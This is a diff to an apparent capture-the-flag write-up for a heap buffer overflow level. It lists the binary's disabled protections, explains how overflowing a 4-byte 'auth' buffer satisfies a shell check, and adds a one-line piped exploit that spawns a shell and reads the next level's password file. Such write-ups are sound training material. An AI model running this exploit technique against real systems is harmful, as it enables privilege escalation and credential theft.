@@ -1,6 +1,17 @@
 ## Level 8 - Heap Buffer Overflow
 Binary has auth command that allocates 4 bytes but allows strcpy of 30+ bytes → heap overflow. Condition checks *(auth + 0x20) != 0 for shell access.
 
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
+
 ### Vulnerability
 - auth allocates 4 bytes but strcpy copies 30 bytes (no bounds check)
 - Heap overflow enables arbitrary memory corruption
@@ -15,16 +26,6 @@ Binary has auth command that allocates 4 bytes but allows strcpy of 30+ bytes �
 - auth + 0x20 = 0x804a038 + 32 = 0x804a058
 - Points into service s3 data (non-zero!) → condition TRUE → shell spawns
 
-### Commands
-```
-service s1
-service s2
-service s3
-auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-login
-cat /home/user/level9/.pass
-exit
-```
 
 ### Key Insights
 - malloc returns addresses 16 bytes (0x10) apart
@@ -32,3 +33,5 @@ exit
 - Service name "s3" stored as non-zero bytes
 - system("/bin/sh") executes with level8 privileges
 
+### Commands
+(echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "service s1"; echo "service s2"; echo "service s3"; echo "login"; sleep 1; echo "cat /home/user/level9/.pass"; sleep 1) | /home/user/level8/level8
